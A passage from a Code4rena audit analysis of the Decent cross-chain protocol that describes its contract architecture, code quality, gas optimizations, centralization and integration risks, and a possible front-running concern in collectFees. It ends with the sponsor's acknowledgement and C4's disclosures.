    In essence, the refund mechanism in Decent is an integral part of its transactional architecture, ensuring that users are protected from losing funds in failed transactions. The system is designed to recognize when a transaction doesn't proceed as expected and to automatically take steps to safeguard users' assets, whether that involves refunding excess tokens from a swap or managing more complex scenarios in cross-chain bridges. This approach not only enhances the security and reliability of the platform but also bolsters user trust in engaging with these advanced blockchain operations.

5. **DcntEth: ERC-20 Compliance and Token Handling**
   - `DcntEth.sol` complies with the ERC-20 standard and is likely used for handling Decent's native tokens within these transactions.
   - It might be involved when the transaction in `UTBExecutor` requires dealing with DcntEth tokens (minting or burning in cross-chain operations).

6. **DecentEthRouter: Routing Logic**
   - It plays a crucial role in managing cross-chain operations, especially in scenarios involving the LayerZero protocol.
   - Its functions might be called post-bridge to handle the delivery of assets or execution of calls on the destination chain.

7. **DecentBridgeExecutor: Final Execution**
   - For operations that involve bridging, `DecentBridgeExecutor` might come into play, especially for executing complex cross-chain transactions.

### Insights into the Logic of Core Functions

- **Flexibility and Interoperability**: The architecture is designed for flexibility, allowing users to pay with different tokens across various chains. The use of swappers and bridge adapters makes the system adaptable to various DEXs and bridge services.
- **Security and Efficiency**: Security is a paramount concern, especially in functions that handle asset transfers and swaps. The use of onlyOwner and similar modifiers ensures controlled access to critical functionalities.
- **User-Centric Design**: The architecture prioritizes user convenience, minimizing the steps they need to take for cross-chain interactions while ensuring that transactions are processed efficiently and securely.

### Logic of `swapAndExecute` in `UTB.sol`

1. **Function Purpose**: 
   - `swapAndExecute` is designed to facilitate transactions that require a token swap before execution. This is typically used for transactions within the same blockchain.

2. **Operational Flow**:
   - **Token Swap**: The function begins by calling `performSwap`, which exchanges the user's token to the required token for the transaction. This involves interacting with a swapper contract (like `UniSwapper`), which handles the swap logic with an external DEX like Uniswap.
   - **Executing Transaction**: Post swap, the swapped tokens are used to execute the desired transaction. This is done by calling the `UTBExecutor` contract with the necessary parameters (target contract, payload, etc.).
   - **Fee Handling**: Concurrently, the function manages transaction fees through interactions with the `UTBFeeCollector`.

3. **Key Considerations**:
   - The function must handle various token standards and ensure accurate execution of swaps.
   - It deals with potential edge cases, such as insufficient liquidity or swap failures, and includes mechanisms to revert or adjust the transaction accordingly.

### Logic of `bridgeAndExecute` in `UTB.sol`

1. **Function Purpose**: 
   - `bridgeAndExecute` allows users to execute transactions on a different blockchain using funds from their current blockchain. This involves bridging assets across chains.

2. **Operational Flow**:
   - **Pre-Bridge Swap (If Needed)**: If the user’s tokens need to be swapped before bridging, `swapAndModifyPostBridge` is invoked. This function swaps the tokens and prepares them for the bridge operation.
   - **Bridging**: The function then calls a bridge adapter (like `DecentBridgeAdapter` or `StargateBridgeAdapter`) to transfer the assets to the target blockchain. This involves complex interactions with cross-chain protocols.
   - **Post-Bridge Execution**: Once the assets are on the destination chain, `UTBExecutor` on that chain executes the intended transaction.
   - **Fee Management**: Similar to `swapAndExecute`, this function also handles fees through the `UTBFeeCollector`.

3. **Key Considerations**:
   - Ensuring the security and reliability of cross-chain transfers is crucial.
   - The function must account for differences in blockchain protocols and handle potential failures or delays in bridging.

### Conclusion
Both `swapAndExecute` and `bridgeAndExecute` embody the essence of Decent's cross-chain capabilities. They showcase not only technical sophistication in handling complex blockchain operations but also an intuitive understanding of user needs in the DeFi space. These functions are pivotal in enabling users to navigate the multi-chain landscape seamlessly, making Decent a notable project in the realm of blockchain interoperability.
In summary, Decent's architecture is a sophisticated web of smart contracts each designed for specific roles yet collectively working towards a seamless cross-chain transaction experience. From initiating transactions in `UTB` to executing actions on destination chains via `UTBExecutor` and `DecentBridgeExecutor`, the system harmonizes different blockchain operations under one umbrella. The design reflects a deep understanding of cross-chain dynamics and user needs in the blockchain space.




## Quality of Codebase:

After an in-depth analysis of the Decent project's codebase, it's clear that the quality is Excellent, showcasing thoughtful architecture and intricate inter-function logic. The codebase demonstrates a sophisticated understanding of blockchain mechanics, especially in terms of cross-chain interactions.

| filename                     | language | code | comment | blank | total |
|------------------------------|----------|------|---------|-------|-------|
| Scope/BaseAdapter.sol        | Solidity | 16   | 1       | 6     | 23    |
| Scope/DcntEth.sol            | Solidity | 27   | 4       | 9     | 40    |
| Scope/DecentBridgeAdapter.sol| Solidity | 137  | 1       | 22    | 160   |
| Scope/DecentBridgeExecutor.sol| Solidity| 57   | 19      | 14    | 90    |
| Scope/DecentEthRouter.sol    | Solidity | 290  | 13      | 38    | 341   |
| Scope/StargateBridgeAdapter.sol| Solidity| 190 | 3       | 29    | 222   |
| Scope/SwapParams.sol         | Solidity | 13   | 5       | 3     | 21    |
| Scope/UTB.sol                | Solidity | 232  | 79      | 32    | 343   |
| Scope/UTBExecutor.sol        | Solidity | 52   | 20      | 11    | 83    |
| Scope/UTBFeeCollector.sol    | Solidity | 50   | 20      | 11    | 81    |
| Scope/UniSwapper.sol         | Solidity | 145  | 3       | 27    | 175   |


1. **Modularity and Readability:**
   - The code is well-structured and modular. Functions and contracts are purposefully segmented, enhancing readability and maintainability. This modularity is evident in the separation of concerns between contracts like `UTB`, `UTBExecutor`, and various adapters.

2. **Complex Logic Handling:**
   - Core functions like `swapAndExecute` and `bridgeAndExecute` in `UTB.sol` are implemented with complex yet clear logic. These functions efficiently orchestrate the sequence of operations – swapping, bridging, and executing transactions across different chains.

3. **Security Practices:**
   - The use of modifiers for access control and adherence to standard security practices, such as checks-effects-interactions pattern, reflects a security-conscious approach. However, the project could benefit from implementing more comprehensive security checks, especially in handling ERC20 `approve` and `transferFrom` methods.

### Recommendations:

1. **Optimization of State Variable Access (GAS-1):**
   - To optimize gas usage, it's recommended to cache state variables in local stack variables in functions where they are accessed multiple times.

2. **Use of `calldata` Over `memory` (GAS-2):**
   - Wherever possible, switching function parameters to `calldata` instead of `memory` will reduce gas costs, particularly in functions that don't mutate these parameters.

3. **Custom Error Handling (GAS-4):**
   - Implementing custom error messages instead of revert strings can optimize gas usage, making the code more efficient.

### Core Logics of the Project:

1. **Cross-Chain Transaction Management:**
   - The heart of Decent lies in its ability to manage complex cross-chain transactions seamlessly. This involves a series of swaps and bridges, handled by respective contracts with high efficiency.

2. **Fee Collection and Management:**
   - `UTBFeeCollector` demonstrates sophisticated logic for handling transaction fees in various scenarios, crucial for maintaining the economic model of the platform.

3. **Security and Efficiency in Swapping and Bridging:**
   - The swapping (via `UniSwapper`) and bridging (via adapters like `DecentBridgeAdapter`) processes are carefully crafted, balancing security and efficiency. Particularly, the integration with external protocols like Uniswap and the handling of token transfers and approvals are executed with precision.

### Conclusion:
Overall, the Decent codebase is technically sound, reflecting a high degree of sophistication in handling cross-chain transactions. While there is always room for optimization, especially in gas usage and security checks, the foundational logic and structure exhibit a high quality of blockchain development practices. The modular design, combined with the intricate interplay of functions and contracts, positions Decent as a technically advanced project in the blockchain space.

## Approach in Evaluating the Decent Codebase

**Initial Overview from Code4rena:**
I began by exploring the Code4rena audit overview for Decent ([link](https://code4rena.com/audits/2024-01-decent#top:~:text=Overview,decent%2Dbridge%20README)). This provided a high-level understanding of the project's goals and key components. The overview highlighted Decent's emphasis on cross-chain interoperability and its unique approach to handling transactions, which was insightful for framing the subsequent deep dive into the documentation and code.

**Detailed Documentation Review:**
Next, I examined the detailed documentation on [docs.decent.xyz](https://docs.decent.xyz). Though there was not much about the smart contracts yet I reviewed the documentation as I was interested in the front end of web3 websites. All the smart contract related info was in the c4 Overview.

**4naly3er Report Analysis:**
The [4naly3er report](https://github.com/code-423n4/2024-01-decent/blob/main/4naly3er-report.md) provided a useful external perspective. The report provides critical technical insights, particularly highlighting areas for gas optimization and security enhancements. Key issues include the need for state variable caching to reduce expensive storage reads (GAS-1), the more efficient use of `calldata` over `memory` for non-mutated function arguments to decrease gas costs (GAS-2), and the application of `unchecked` blocks for operations that won't cause overflow, thus saving gas by avoiding superfluous safety checks (GAS-3). Additionally, the report underscores the importance of validating `approve` calls in ERC20 operations (NC-1) and adjusting function visibility from public to external where appropriate for gas savings (NC-2). These findings are pivotal for refining the Decent codebase, focusing on optimizing contract efficiency while maintaining robust security protocols.

**Automated Findings Review:**
Exploring the [automated findings](https://github.com/code-423n4/2024-01-decent/blob/main/bot-report.md) helped pinpoint potential vulnerabilities and common issues in the code. This gave me an understanding of the programmers' strengths and weaknesses, guiding my code review towards critical areas that might require more thorough scrutiny.

**In-Depth Codebase Review:**
Armed with comprehensive project knowledge, I delved into the codebase, file by file:

1. **src/UTB.sol (232 SLOC)**: This contract is central to the project, managing the core functions `swapAndExecute` and `bridgeAndExecute`. Its intricate logic for handling different transaction types was both complex and elegantly implemented.

2. **src/UTBExecutor.sol (52 SLOC)**: This contract, while smaller, is crucial for executing external contract calls post-swap/bridge. Its streamlined and secure execution flow was noteworthy.

3. **src/UTBFeeCollector.sol (50 SLOC)**: The fee collection logic here is vital for the economic model of Decent. The secure and efficient handling of fee transactions in various token types was impressive.

4. **Bridge Adapters (DecentBridgeAdapter.sol & StargateBridgeAdapter.sol)**: These adapters (137 and 190 SLOC, respectively) implement the bridging functionality. Their ability to interface with different bridging protocols while maintaining a consistent approach to handling assets was a testament to the system’s flexibility.

5. **src/swappers/UniSwapper.sol (145 SLOC)**: As an implementation of `ISwapper` for Uniswap V3, this contract stood out for its adaptability in swap logic and integration with a major DEX.

6. **Decent-Bridge Contracts (DcntEth.sol, DecentEthRouter.sol, DecentBridgeExecutor.sol)**: These contracts (27, 290, and 57 SLOC, respectively) form the backbone of the bridge logic. The `DecentEthRouter.sol`, in particular, with its comprehensive bridging logic, was a highlight for its complex yet efficient handling of cross-chain transactions.

**Testing and Observations:**
Following the setup instructions, I ran tests using `forge test`. One notable observation was how the tests covered a range of scenarios, ensuring that each contract function behaved as expected under different conditions. The tests provided a practical demonstration of the contracts' robustness and the effectiveness of their error-handling mechanisms.

**Unique Insights:**
Throughout this process, what stood out was the harmonious integration of multiple contracts, each with its distinct role, yet all contributing to a cohesive user experience. The project's ability to abstract complex cross-chain interactions into user-friendly functionalities was particularly impressive. Additionally, the meticulous attention to security and efficiency in contract design was evident across the codebase.

### Conclusion
In conclusion, my approach to evaluating Decent's codebase was thorough and multi-faceted, encompassing an initial overview, detailed documentation analysis, external report review, and an in-depth examination of each contract. The project's sophisticated handling of cross-chain transactions, combined with its emphasis on security and user experience, positions it as a notable contribution to the blockchain space.

## Risks related to the project

Evaluating the Decent project's risk model involves a thorough analysis of various aspects, including administrative, systemic, technical, and integration risks. These risks must be carefully considered to understand their impact on the project's security, functionality, and reliability.

### 1. Admin Abuse Risks:
- **Centralization of Control**: The presence of functions like `setExecutor`, `setWrapped`, `registerSwapper`, and `registerBridge` in `UTB.sol` and similar administrative functions in other contracts imply a level of centralization. These functions, controlled by the owner or specific roles, could potentially be abused, leading to manipulation or disruption of the system's normal operations.
- **Mitigation Strategies**:
  - Implement a multi-signature mechanism for critical administrative functions to distribute control.
  - Introduce time-locks for sensitive operations, providing users with a window to react to unfavorable changes.

### 2. Systemic Risks:
- **Dependency on External Protocols**: The reliance on external bridges and DEXes like Uniswap for swapping (via `UniSwapper.sol`) introduces systemic risks. These include liquidity issues, smart contract vulnerabilities in these protocols, or changes in their operation models.
- **Inter-Contract Dependencies**: The functionality of the system heavily relies on the seamless interaction between contracts like `UTB`, `UTBExecutor`, and various adapters and swappers.
- **Mitigation Strategies**:
  - Regularly update and audit the list of supported protocols and bridges to ensure their security and reliability.
  - Implement robust error handling and fallback mechanisms to manage failures in inter-contract calls.

### 3. Technical Risks:
- **Smart Contract Vulnerabilities**: Common risks like reentrancy attacks, overflow/underflow, and unhandled exceptions are pertinent. Although the project demonstrates good security practices, the complexity of functions like `swapAndExecute` and `bridgeAndExecute` increases the surface area for potential exploits.
- **Gas Optimization**: As highlighted in the 4naly3er report, there are several areas where gas optimization can be improved. Inefficient gas usage could make the system economically unviable in the long term, especially during high network congestion.
- **Mitigation Strategies**:
  - Continuously audit and test the smart contracts, especially after major updates or integration of new features.
  - Implement the suggested gas optimizations to ensure economic efficiency.

### 4. Integration Risks:
- **Interoperability with Multiple Chains**: As a cross-chain solution, integration risks include handling different blockchain protocols, transaction finality times, and consensus mechanisms.
- **External Dependency**: The project's reliance on LayerZero and other bridging protocols for cross-chain functionality introduces risks associated with these external systems.
- **Mitigation Strategies**:
  - Conduct thorough testing for each blockchain integration, considering their unique characteristics and potential edge cases.
  - Monitor the external protocols and adapt to changes or updates in their systems.

### Conclusion:
In conclusion, while the Decent project showcases a technically sophisticated approach to cross-chain transactions, it is not immune to risks typical of complex blockchain systems. Admin abuse risks highlight the need for decentralized governance mechanisms, systemic risks point to dependencies on external systems, technical risks underline the importance of continuous security practices, and integration risks stress the challenges of operating in a multi-chain environment. Proactively addressing these risks through robust design choices, ongoing audits, and adaptive strategies is crucial for the project's long-term success and security.


## Recommendations for Software Engineers
Understanding the technical importance of resource management in the context of the Decent project, particularly for the contracts like `UniSwapper` and bridge contracts, is critical for software engineers. Here's a more technical examination of why each point is significant:

### Contract Complexity
- **Technical Aspect**: In `UniSwapper`, multiple calls to external contracts such as DEXs (e.g., Uniswap) are made. Each of these calls consumes gas, and when compounded across several operations within a single transaction, the cumulative gas cost can escalate quickly.
- **Evidence in Project**: Consider a function like `swapExactIn` in `UniSwapper.sol`. It first approves the token for swapping, then performs the swap via the Uniswap router. Both steps consume gas, and if this function is part of a larger transaction workflow, the total gas cost can become significant, impacting transaction feasibility.

### External Calls and Gas Costs
- **Technical Aspect**: External calls, particularly those interacting with complex protocols, have variable gas costs that can be hard to predict. Misestimating these costs can lead to transaction failures or inefficiencies.
- **Evidence in Project**: In `bridgeAndExecute` within `UTB.sol`, the contract interacts with bridge adapters. These operations involve external calls whose gas costs can vary based on the current state and activity of the respective blockchain network.

### Handling of State Variables
- **Technical Aspect**: Efficiently handling state variables, especially in smart contracts, is crucial for minimizing gas usage. Every read from and write to storage incurs gas, and these costs can multiply in contracts with frequent state interactions.
- **Evidence in Project**: In `UTB.sol`, the contract maintains mappings for swappers and bridge adapters. If these mappings are accessed repeatedly within a single function or transaction flow, it could lead to higher gas consumption than necessary. For instance, frequent access to `swappers` or `bridgeAdapters` mappings in the midst of complex transaction logic could be optimized.

### Transaction Failure Risks
- **Technical Aspect**: Underestimating gas requirements, particularly in functions orchestrating multiple steps or interacting with external contracts, can lead to transaction failures. This not only wastes gas but also impacts user confidence.
- **Evidence in Project**: Functions like `swapAndExecute` and `bridgeAndExecute` orchestrate a sequence of actions, including token swaps and cross-chain bridges. If gas estimation for these sequences is not accurate, especially under varying network conditions, it could lead to incomplete transactions, thereby affecting the reliability of the service.

In essence, for software engineers working on the Decent project, focusing on these aspects is not just about optimizing gas costs; it's about ensuring the reliability, efficiency, and user experience of the platform. The challenge lies in managing the complex interplay of contract interactions, state management, and dynamic gas estimations, all crucial for the seamless operation of a cross-chain DeFi platform.

## Weakspots

There's potential risk for MEV or transaction frontrun in collectFees()

### Analysis of the `collectFees` Function:

1. **Function Implementation**: 
   - The `collectFees` function, typically part of a fee management system in blockchain projects, is designed to handle the collection and possibly the redistribution of transaction fees. 
   - In Decent's `UTBFeeCollector.sol`, the function takes the fee details and a signature as parameters. It verifies the signature, ensuring the fee collection request is legitimate.

2. **Funds Transfer and Adjusting Fee Parameters**:
   - The function does involve transferring ERC20 tokens as part of fee collection. It's essential to verify if this transfer is from a user to the contract (which is less risky) or involves more sensitive transfers (like redistributing funds to other parties).

3. **MEV and Frontrunning Risks**:
   - MEV risks primarily arise when there's potential for transaction order manipulation to yield profit. In `collectFees`, if the function transfers fees to different parties or adjusts fee parameters, it might be a potential target for such attacks.
   - Frontrunning risks could occur if attackers can foresee profitable outcomes from the execution of `collectFees` (e.g., fee distribution) and preemptively submit their transactions.

4. **Lack of Deadline Parameter**:
   - The absence of a deadline or a similar mechanism in `collectFees` does not directly expose it to MEV or frontrunning if the function's internal logic doesn't involve operations where transaction ordering can be exploited for profit.
   - However, if the function influences other contract states or financial distributions in a way that could be gamed, then not having a temporal constraint might increase the risk.

### Impact and Consideration:

- If `collectFees` is strictly for collecting fees without influencing other contract states or financial distributions significantly, the lack of a deadline might not pose a high risk.
- However, if the function has a broader impact – for example, it triggers other financial operations or state changes – then the absence of a deadline could make it more susceptible to MEV and frontrunning. 

### Time spent:
9 hours

**[wkantaros (Decent) acknowledged and commented](https://github.com/code-423n4/2024-01-decent-findings/issues/667#issuecomment-1917940489):**
 > High quality report.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
